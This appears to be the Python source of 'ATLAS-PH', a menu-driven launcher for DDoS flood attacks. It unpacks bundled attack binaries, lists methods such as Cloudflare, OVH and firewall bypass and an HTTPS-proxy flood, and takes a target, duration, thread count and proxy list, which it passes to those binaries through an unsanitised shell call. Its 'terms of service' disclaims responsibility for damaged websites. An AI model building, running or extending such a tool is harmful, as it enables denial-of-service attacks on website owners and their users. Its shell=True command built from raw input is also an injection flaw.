#ATLAS-PH v1
#Stealing my codes will not make you the Author you are Skid!
import os
import sys
import time
from subprocess import run
from colorama import Fore, Back, Style
from time import sleep
from rich.console import Console

try:
    import colorama, rich
except:
    if sys.platform.startswith("linux"):
        os.system("pip3 install colorama && pip3 install rich && pip install unzip")
    elif sys.platform.startswith("freebsd"):
        os.system("pip3 install colorama && pip3 install rich && pip install unzip")

os.system("cd methods && chmod +x *")

os.system("unzip methods.zip")
os.system("unzip ATLAS-METHODS.zip && mv ATLAS-METHODS methods")

console = Console()
tasks = [f"task {n}" for n in range(1, 3)]

with console.status("[bold green]Finding missing on files...") as status:
    while tasks:
        task = tasks.pop(0)
        sleep(1)
        console.log(f"{task} complete")
        try:
            file = open('key.txt')
            file1 = open('proxy.txt')
            file2 = open('requirements.txt')
            print("[X] All files Scanned Completed!")
            file.close()
            file1.close()
            file2.close()
        except IOError:
            print("[X] Some files does not exist, Please install again!")
            sys.exit(0)
def unavail():
    print("""
╔════════════════════════════════════════════════════════════════════════╗
║            SORRY THE METHOD YOU ARE TRYING IS UNAVAILABLE              ║           
╚════════════════════════════════════════════════════════════════════════╝
    """)
def tos():
    print("""\033[1;31;40m
╔════════════════════════════════════════════════════════════════════════╗
║                            \033[2;30;42mTERMS OF SERVICE\033[1;31;40m                            ║
╠════════════════════════════════════════════════════════════════════════╣
║ FROM ATLAS ADMIN:                                                      ║
║ We are not responsible.                                                ║
║ if any of you who do not own a website are damaged,                    ║ 
║ before you use this tool you must accept our TOS, for confirmation     ║  
║ and a promise that we will not be held responsible for the             ║ 
║ damage you have done to the damaged website.                           ║
╚════════════════════════════════════════════════════════════════════════╝

    """)
    accept = input("Do you agree in our TOS [Y/N]: ")
    if (accept == "Y") or (accept == "y"):
        time.sleep(2)
        print("[X] Proceeding...")
        menu()
    if (accept == "N") or (accept == "n") or (accept == "no") or (accept == "No"):
        sys.exit(0)

def banner():
    print("""\033[1;32;40m
    \033[1;31;40m-- [ \033[2;30;42mCONNECTION ESTABLISHED\033[1;31;40m ] --\033[1;32;40m
        ╔═╗╔╦╗╦  ╔═╗╔═╗   ╔═╗╦ ╦
        ╠═╣ ║ ║  ╠═╣╚═╗───╠═╝╠═╣
        ╩ ╩ ╩ ╩═╝╩ ╩╚═╝   ╩  ╩ ╩\033[1;31;40m
     -- \033[1;32;40mANONPRIXOR \033[1;31;40m & \033[1;32;40mMsYor \033[1;31;40m & \033[1;32;40mAYA \033[1;31;40m -- 
      Type dev to see who develop
    """)
def repeater():
    repeat = input("[Atlas Bot] Do you want to go back to menu? [Y/N]: ")
    if (repeat == "Y") or (repeat == "y"):
        time.sleep(2)
        menu()
    if (repeat == "N") or (repeat == "n"):
        time.sleep(2)
        print("GOODBYE!")
        sys.exit(0)
def OSclear():
	os.system('clear' if os.name == 'posix' else 'cls')

def menu():
    OSclear()
    banner()
    print("""
╔════════════════════════════════════════════════════════════╗
║    [1] USER INFO \033[1;32;40m[See user info, VIP or NON-VIP]\033[1;31;40m           ║
║    [2] METHODS \033[1;32;40m[View Methods]\033[1;31;40m                              ║
║    [3] FILE UPDATE \033[1;32;40m[You can see new updates in our Files]  \033[1;31;40m║
╚════════════════════════════════════════════════════════════╝

    """)
    choose1 = input("atlas-api@free@#~> ")
    if (choose1 == "1"):
        userinfo()
    if (choose1 == "2"):
        launchflood()
    if (choose1 == "3"):
        fileupdate()
    if (choose1 == "dev"):
        developer()

#UserINFO
def userinfo():
    OSclear()
    print("""
╔════════════════════════════════════════════════════════════╗
║     USER TYPE: \033[1;32;40mFREE-USER        \033[1;31;40m                           ║
║     ADMIN PERM: \033[1;32;40mNO PERMISSION     \033[1;31;40m                         ║
║     ATTACK TIME: \033[1;32;40mUNLIMITED       \033[1;31;40m                          ║
║     USER EXPIRATION: \033[1;32;40mJanuary 1, 2038    \033[1;31;40m                   ║
║     METHODS ACCESS: \033[1;32;40mTRUE              \033[1;31;40m                     ║
╚════════════════════════════════════════════════════════════╝
    """)
    repeater()

def launchflood():
    OSclear()
    print("""
╔═════════════════╦═══════════════════════╦══════════════════════╦═════════════════════╗
║    \033[1;37;40mMETHODS      \033[1;31;40m║      \033[1;37;40mINFORMATION      \033[1;31;40m║      \033[1;37;40mPERMISSION      \033[1;31;40m║       \033[1;37;40mSTATUS        \033[1;31;40m║
╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
║  \033[1;36;40mATLAS-YOLANDA  \033[1;31;40m║ \033[1;36;40mBYPASS SOME FIREWALLS \033[1;31;40m║      \033[1;36;40mFREE-USER       \033[1;31;40m║      \033[2;30;42mAVAILABLE\033[1;31;40m      ║
╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
║   \033[1;36;40mATLAS-STORM   \033[1;31;40m║  \033[1;36;40mBYPASS NORMAL CLOUD  \033[1;31;40m║      \033[1;36;40mFREE-USER       \033[1;31;40m║      \033[2;30;42mAVAILABLE\033[1;31;40m      ║
╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
║   \033[1;36;40mATLAS-HTTPS   \033[1;31;40m║  \033[1;36;40mHTTPS-PROXY ATTACK   \033[1;31;40m║      \033[1;36;40mFREE-USER       \033[1;31;40m║      \033[2;30;42mAVAILABLE\033[1;31;40m      ║
╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
║   \033[1;36;40mATLAS-NULL    \033[1;31;40m║ \033[1;36;40mBYPASS OVH-DIGI SITES \033[1;31;40m║      \033[1;36;40mFREE-USER       \033[1;31;40m║      \033[2;30;42mAVAILABLE\033[1;31;40m      ║
╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
║   \033[1;36;40mATLAS-UAM     \033[1;31;40m║ \033[1;36;40mBYPASS CLOUDFLARE UAM \033[1;31;40m║      \033[1;36;40mFREE-USER       \033[1;31;40m║     \033[1;31;47mUNAVAILABLE\033[1;31;40m     ║
╚═════════════════╩═══════════════════════╩══════════════════════╩═════════════════════╝
    """)
    methods = input("[X] Choose Methods: ")
    if (methods == "ATLAS-YOLANDA") or (methods == "atlas-yolanda"):
        target = input("[X] Target: ")
        time = input("[X] Time: ")
        thread = input("[X] Threads [3]: ")
        spoof = input("[X] Spoof List [proxy.txt]: ")
        proxylist = input("[X] Proxy List [proxy.txt]: ")
        run([f'./methods/ATLAS-METHODY {target} {time} {thread} {spoof} {proxylist}'], shell=True)
    if (methods == "ATLAS-STORM") or (methods == "atlas-storm"):
        target = input("[X] Target: ")
        time = input("[X] Time: ")
        thread = input("[X] Threads [5-10]: ")
        run([f'./methods/ATLAS-METHODS {target} {time} storm {thread}'], shell=True)
    if (methods == "ATLAS-HTTPS") or (methods == "atlas-https"):
        target = input("[X] Target: ")
        time = input("[X] Time: ")
        thread = input("[X] Threads [5-10]: ")
        run([f'./methods/ATLAS-METHODS {target} {time} proxy {thread}'], shell=True)
    if (methods == "ATLAS-NULL") or (methods == "atlas-null"):
        target = input("[X] Target: ")
        time = input("[X] Time: ")
        thread = input("[X] Threads [5-10]: ")
        run([f'./methods/ATLAS-METHODS {target} {time} null-x {thread}'], shell=True)
    if (methods == "ATLAS-UAM") or (methods == "atlas-uam"):
        unavail()
        repeater()
    #if (methods == "ATLAS-UAM") or (methods == "atlas-uam"):
    #    target = input("[X] Target: ")
    #    time = input("[X] Time: ")
    #    thread = input("[X] Threads [5-10]: ")
    #    run([f'./methods/ATLAS-METHODS {target} {time} uam {thread}'], shell=True)


#FileUpdates
def fileupdate():
    OSclear()
    print("""
╔════════════════════════════════════════════════════════════╗
║     FILE VERSION: \033[1;32;40mV1 \033[1;31;40m                                      ║
║     LAST UPDATE: \033[1;32;40mNovember 5, 2022   \033[1;31;40m                       ║
║     NEXT UPDATE: \033[1;32;40mView on my GITHUB  \033[1;31;40m                       ║
╚════════════════════════════════════════════════════════════╝   
    """)
    repeater()

#DeveloperInfo
def developer():
    OSclear()
    print("""
╔════════════════════════════════════════════════════════════╗
║     DEVELOPER: ANONPRIXOR                                  ║
║     COMPILED SCRIPTS: AYA & MSYOR                          ║        
╚════════════════════════════════════════════════════════════╝

    """)
    repeater()

tos()
